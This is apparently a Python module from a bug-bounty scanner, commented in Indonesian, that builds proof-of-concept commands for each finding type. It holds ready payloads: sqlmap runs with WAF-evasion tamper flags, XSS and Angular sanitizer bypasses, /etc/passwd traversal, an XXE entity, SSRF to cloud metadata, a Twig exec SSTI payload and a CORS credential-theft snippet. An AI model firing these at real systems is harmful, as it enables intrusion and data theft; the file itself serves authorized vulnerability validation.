"""
PoC Generator
==============
Menghasilkan command PoC (Proof of Concept) yang spesifik untuk tiap
jenis temuan — lengkap dengan endpoint, parameter, dan method yang
benar-benar ditemukan, bukan template generik.

Dipanggil otomatis oleh replay_scan.py, orchestrator.py, dan bugbounty.py
setiap kali finding baru dibuat. Hasilnya masuk ke field "poc" di
findings.json dan ditampilkan di laporan Word.
"""

from urllib.parse import urlparse, urlencode


def _base_url(endpoint):
    """Ekstrak URL bersih dari endpoint string (bisa berupa raw request line)."""
    if endpoint.startswith("http"):
        return endpoint
    # Format: "POST /path HTTP/1.1 (Host: example.com)"
    import re
    host_m = re.search(r"\(Host:\s*([^)]+)\)", endpoint)
    path_m = re.match(r"(?:GET|POST|PUT|DELETE|PATCH)\s+(\S+)", endpoint)
    if host_m and path_m:
        host = host_m.group(1).strip()
        path = path_m.group(1).strip()
        scheme = "https" if "443" in host else "http"
        host = host.replace(":443", "").replace(":80", "")
        return f"{scheme}://{host}{path}"
    return endpoint


def generate_poc(finding):
    """
    Return dict berisi:
        command  : command siap copy-paste
        steps    : langkah validasi manual (list of string)
        tool     : nama tool yang dipakai untuk PoC
        waf_note : catatan kalau ada WAF yang perlu diperhatikan
    """
    source   = finding.get("source", "")
    name     = (finding.get("name") or "").lower()
    endpoint = finding.get("endpoint", "")
    param    = finding.get("parameter") or "PARAM"
    method   = (finding.get("method") or "GET").upper()
    status   = finding.get("status", "candidate")
    template = finding.get("template_id", "")
    raw_file = _extract_raw_file(finding)
    url      = _base_url(endpoint)

    # Dispatch ke generator yang sesuai
    if "sql" in name or "sqli" in name or source in ("sqlmap", "sqlmap_replay"):
        return _poc_sqli(url, param, method, status, raw_file, finding)

    if "xss" in name or source in ("dalfox", "dalfox_replay", "dalfox_bugbounty"):
        return _poc_xss(url, param, method, finding)

    if "cors" in name or source == "cors_checker":
        return _poc_cors(url)

    if "smuggling" in name or source in ("smuggler", "smuggler_replay"):
        return _poc_smuggling(url)

    if "lfi" in name or "local file" in name:
        return _poc_lfi(url, param, method)

    if "ssrf" in name:
        return _poc_ssrf(url, param, method)

    if "redirect" in name or "open redirect" in name:
        return _poc_redirect(url, param, method)

    if "ssti" in name:
        return _poc_ssti(url, param, method)

    if "rce" in name or "remote code" in name:
        return _poc_rce(url, param, method)

    if "xxe" in name:
        return _poc_xxe(url, param, method)

    if source in ("nuclei", "nuclei_replay", "nuclei_bugbounty") and template:
        return _poc_nuclei(url, template)

    if "sensitive" in name or "disclosure" in name or "exposed" in name:
        return _poc_disclosure(url)

    # Generic fallback
    return {
        "tool":     "curl",
        "command":  f'curl -sk "{url}" -v',
        "steps":    ["Buka endpoint di browser dan amati response",
                     "Cek response header dan body untuk informasi sensitif"],
        "waf_note": None,
    }


def _extract_raw_file(finding):
    """Coba ambil nama file raw request dari field note."""
    import re
    note = finding.get("note", "")
    m = re.search(r"\(([^)]+\.txt)\)", note)
    return m.group(1) if m else None


# ---------------------------------------------------------------------------
# PoC per kategori
# ---------------------------------------------------------------------------

def _poc_sqli(url, param, method, status, raw_file, finding):
    injection_type = finding.get("injection_type") or ""
    waf = status == "waf_protected"

    # Tentukan teknik sqlmap dari injection_type yang sudah diketahui
    technique_map = {
        "boolean": "B", "time": "T", "error": "E",
        "union": "U", "stacked": "S",
    }
    technique = None
    for k, v in technique_map.items():
        if k in injection_type.lower():
            technique = v
            break
    technique_flag = f"--technique={technique}" if technique else ""

    tamper_flag = "--tamper=space2comment,between,charencode" if waf else ""
    param_flag  = f"-p {param}" if param and param != "PARAM" else ""

    if raw_file:
        base_cmd = f'sqlmap -r "captured_requests/{raw_file}" --batch --force-ssl'
    else:
        method_flag = f'--data "REPLACE_WITH_POST_BODY"' if method == "POST" else ""
        base_cmd = f'sqlmap -u "{url}" --batch --force-ssl {method_flag}'

    cmd_parts = [base_cmd, param_flag, technique_flag, tamper_flag,
                  "--level=3 --risk=2 --delay=2 --threads=1 -v 3"]
    command = " ".join(p for p in cmd_parts if p.strip())

    steps = [
        f"Buka Burp Repeater, kirim request ke {url}",
        f"Ubah nilai parameter '{param}' menjadi: {param}' (tambah single quote)",
        "Kalau response berbeda/error 500 → tanda query terpengaruh (indikasi injectable)",
        f"Coba: {param}' AND '1'='1  (harus sama dengan normal)",
        f"Coba: {param}' AND '1'='2  (harus berbeda dari normal → injectable!)",
        "Kalau terbukti injectable, jalankan command di atas untuk konfirmasi teknis",
    ]

    waf_note = None
    if waf:
        waf_note = (
            "WAF terdeteksi memblokir payload langsung. Sudah otomatis ditambahkan "
            "tamper script (space2comment,between,charencode) untuk obfuscate payload. "
            "Kalau masih diblokir, coba tamper lain: --tamper=randomcase,equaltolike,percentage"
        )

    return {
        "tool":     "sqlmap",
        "command":  command,
        "steps":    steps,
        "waf_note": waf_note,
    }


def _poc_xss(url, param, method, finding):
    evidence  = finding.get("evidence") or ""
    is_angular = any(k in url for k in []) or \
                 "angular" in evidence.lower()
    param_invalid = not param or param in ("N/A", "null", "none", "")

    # Kalau parameter tidak diketahui, PoC tidak bisa di-generate spesifik
    if param_invalid:
        return {
            "tool":    "Browser (manual)",
            "command": f'# Parameter tidak teridentifikasi otomatis\n'
                       f'# Validasi manual: buka URL di browser dan test tiap input field\n'
                       f'# Payload dasar: <img src=x onerror=alert(document.domain)>\n'
                       f'# URL target: {url}',
            "steps": [
                "Parameter tidak berhasil diidentifikasi otomatis oleh Dalfox — kemungkinan false positive",
                "Buka URL target di browser (yang di-proxy ke Burp)",
                "Cari semua input field di halaman (form, search box, komentar, dll)",
                "Coba masukkan payload ke setiap field: <img src=x onerror=alert(document.domain)>",
                "Kalau muncul alert dialog di browser → XSS terkonfirmasi",
                "Kalau tidak ada alert → tandai sebagai false positive",
                "Perhatikan: kalau aplikasi pakai Angular/React/Vue, XSS melalui curl tidak valid",
            ],
            "waf_note": "Temuan ini perlu validasi manual — tidak cukup bukti dari scan otomatis.",
        }

    payload_basic   = '<img src=x onerror=alert(document.domain)>'
    payload_encoded = payload_basic.replace("<", "%3C").replace(">", "%3E")\
                                   .replace("(", "%28").replace(")", "%29")
    payload_script  = '<script>alert(document.domain)</script>'
    payload_encoded2 = payload_script.replace("<", "%3C").replace(">", "%3E")\
                                      .replace("(", "%28").replace(")", "%29")\
                                      .replace("/", "%2F")

    if method == "POST":
        cmd = (f'curl -sk -X POST "{url}" '
               f'-d \'{param}={payload_basic}\' '
               f'-v 2>&1 | grep -i "onerror\\|src=x\\|alert"')
    else:
        sep = "&" if "?" in url else "?"
        cmd = (f'# Cek via curl (deteksi reflection di response body)\n'
               f'curl -sk "{url}{sep}{param}={payload_encoded}" '
               f'| grep -o "onerror[^<]*"\n\n'
               f'# Konfirmasi via browser (wajib untuk SPA/Angular/React):\n'
               f'# Buka: {url}{sep}{param}={payload_encoded2}')

    steps = [
        f"[Curl] Kirim payload ke parameter '{param}', cek apakah ter-reflect di response body",
        "PENTING: curl tidak menjalankan JavaScript — reflection di HTML belum berarti XSS beneran",
        "[Browser] Buka URL dengan payload di browser (yang di-proxy ke Burp)",
        f"Payload yang lebih aman: <img src=x onerror=alert(document.domain)>",
        "Kalau muncul alert di browser → XSS terkonfirmasi",
        "Cek Content-Type response: kalau 'application/json' → hampir pasti false positive",
    ]

    if is_angular:
        steps += [
            "KHUSUS ANGULAR: Angular punya built-in XSS protection (sanitizer)",
            "Coba bypass Angular sanitizer: {{constructor.constructor('alert(1)')()}}",
            "Atau: <div ng-app ng-csp><script>alert(1)</script></div>",
            "Kalau Angular versi lama (<1.6), coba: {{7*7}} dulu — kalau muncul 49 → template injection",
        ]
        steps.append("Coba di Burp Repeater: kirim request dengan payload dan amati response mentahnya")

    waf_note = None
    if evidence:
        waf_note = f"Evidence dari Dalfox: {evidence[:200]}"

    return {
        "tool":     "Browser + Burp Repeater",
        "command":  cmd,
        "steps":    steps,
        "waf_note": waf_note,
    }


def _poc_cors(url):
    cmd = (f'curl -sk -H "Origin: https://evil.attacker.com" '
           f'-H "Access-Control-Request-Method: GET" '
           f'-I "{url}" | grep -i "access-control"')

    steps = [
        f"Kirim request ke {url} dengan header Origin palsu",
        "Cek response header Access-Control-Allow-Origin (ACAO)",
        "Kalau ACAO: https://evil.attacker.com (di-echo balik) → vulnerable",
        "Kalau ACAO: * dan ada Access-Control-Allow-Credentials: true → High severity",
        "Buat HTML PoC sederhana untuk buktikan credential theft:",
        '  <script>fetch("' + url + '",{credentials:"include"})'
        '.then(r=>r.text()).then(d=>document.body.innerText=d)</script>',
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_smuggling(url):
    parsed = urlparse(url)
    host = parsed.netloc or url
    scheme = parsed.scheme or "https"
    base = f"{scheme}://{host}"

    cmd = f'smuggler -u "{base}" -v'

    steps = [
        f"Jalankan Smuggler terhadap host: {base}",
        "Perhatikan output untuk baris bertanda VULNERABLE",
        "Catat tipe desync yang terdeteksi (CL.TE / TE.CL / TE.TE)",
        "PENTING: Jangan ulangi test ini berkali-kali di server production",
        "Validasi manual lewat Burp Suite → Repeater dengan request yang sudah disiapkan",
        "Gunakan Burp Extension 'HTTP Request Smuggler' untuk konfirmasi lebih aman",
    ]

    return {
        "tool":     "smuggler",
        "command":  cmd,
        "steps":    steps,
        "waf_note": "HTTP Smuggling sangat berisiko di server production. "
                    "Lakukan validasi seminimal mungkin dan hentikan begitu terbukti.",
    }


def _poc_lfi(url, param, method):
    payloads = ["../../../etc/passwd", "....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd"]
    sep = "&" if "?" in url else "?"
    cmd = f'curl -sk "{url}{sep}{param}=../../../etc/passwd" | grep -i "root:"'

    steps = [
        f"Kirim payload traversal ke parameter '{param}'",
        "Payload dasar: ../../../etc/passwd",
        "Payload bypass filter: ....//....//etc/passwd atau ..%2F..%2F..%2Fetc%2Fpasswd",
        "Kalau response mengandung 'root:' → LFI terbukti",
        "Untuk Windows target, coba: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_ssrf(url, param, method):
    sep = "&" if "?" in url else "?"
    cmd = (f'curl -sk "{url}{sep}{param}=http://127.0.0.1:80" -v '
           f'| grep -i "server\\|content-type\\|200"')

    steps = [
        f"Ubah nilai parameter '{param}' ke URL internal: http://127.0.0.1:80",
        "Coba juga: http://169.254.169.254/latest/meta-data/ (AWS metadata)",
        "Coba: http://10.0.0.1 atau http://192.168.1.1 (internal network)",
        "Kalau response berbeda dari URL invalid → SSRF terbukti",
        "Gunakan Burp Collaborator / interactsh untuk out-of-band confirmation:",
        "  Ganti URL dengan: http://COLLABORATOR_URL dan cek ping masuk",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_redirect(url, param, method):
    sep = "&" if "?" in url else "?"
    cmd = (f'curl -sk -L "{url}{sep}{param}=https://evil.attacker.com" '
           f'-I | grep -i "location:"')

    steps = [
        f"Ubah nilai parameter '{param}' ke URL eksternal: https://evil.attacker.com",
        "Kirim request dan amati response header Location:",
        "Kalau redirect mengarah ke evil.attacker.com → Open Redirect terbukti",
        "Coba bypass filter: https:evil.attacker.com atau //evil.attacker.com",
        "Buka URL di browser untuk konfirmasi visual (browser pindah ke attacker.com)",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_ssti(url, param, method):
    payload = "{{7*7}}"
    sep = "&" if "?" in url else "?"
    encoded_payload = "%7B%7B7*7%7D%7D"
    cmd = (f'curl -sk "{url}{sep}{param}={encoded_payload}" '
           f'| grep -o "49"')

    steps = [
        f"Ubah nilai parameter '{param}' menjadi: {{{{7*7}}}}",
        "Kalau response mengandung '49' → SSTI terbukti (template dieksekusi)",
        "Identifikasi template engine yang dipakai dari pola error/response",
        "Untuk Jinja2: {{config.items()}} untuk baca config",
        "Untuk Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}",
        "HATI-HATI: Jangan gunakan payload RCE di luar scope yang diizinkan",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_rce(url, param, method):
    sep = "&" if "?" in url else "?"
    cmd = (f'curl -sk "{url}{sep}{param}=id" | grep -i "uid="')

    steps = [
        f"Ubah nilai parameter '{param}' menjadi command OS sederhana: id",
        "Kalau response mengandung 'uid=' → RCE terbukti",
        "Untuk PoC yang aman, gunakan: sleep 5 (amati delay response)",
        "Hentikan di sini — jangan lanjutkan ke command berbahaya/destruktif",
        "Dokumentasikan output 'id' atau 'whoami' sebagai bukti",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": "RCE adalah temuan kritis. Validasi seminimal mungkin "
                    "(cukup 'id' atau 'whoami'), jangan gunakan payload destruktif.",
    }


def _poc_xxe(url, param, method):
    payload = ('<?xml version="1.0"?><!DOCTYPE root '
               '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
               '<root>&xxe;</root>')
    cmd = (f'curl -sk -X POST "{url}" '
           f'-H "Content-Type: application/xml" '
           f'-d \'{payload}\' | grep -i "root:"')

    steps = [
        "Kirim XML dengan External Entity yang mengarah ke file lokal server",
        "Payload: <!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        "Kalau response mengandung isi /etc/passwd → XXE terbukti",
        "Coba juga: file:///etc/hostname atau file:///proc/version",
        "Untuk out-of-band: ganti SYSTEM URL ke server kamu (Burp Collaborator)",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_nuclei(url, template_id):
    cmd = f'nuclei -u "{url}" -id "{template_id}" -v'

    steps = [
        f"Jalankan ulang Nuclei dengan template spesifik: {template_id}",
        "Tambahkan -v untuk melihat request/response detail",
        "Cek output untuk payload yang dikirim dan response yang diterima",
        "Buka endpoint di browser untuk konfirmasi visual",
    ]

    return {
        "tool":     "nuclei",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }


def _poc_disclosure(url):
    cmd = f'curl -sk "{url}" | grep -iE "api[_-]?key|secret|password|token|bearer|aws"'

    steps = [
        f"Buka endpoint {url} di browser atau curl",
        "Cari pattern: API key, secret, password, JWT token, AWS credential",
        "Verifikasi apakah credential itu masih aktif (jangan gunakan untuk akses)",
        "Dokumentasikan temuan dengan screenshot sebagai bukti",
        "Pastikan ini bukan dummy/test value sebelum dilaporkan",
    ]

    return {
        "tool":     "curl",
        "command":  cmd,
        "steps":    steps,
        "waf_note": None,
    }
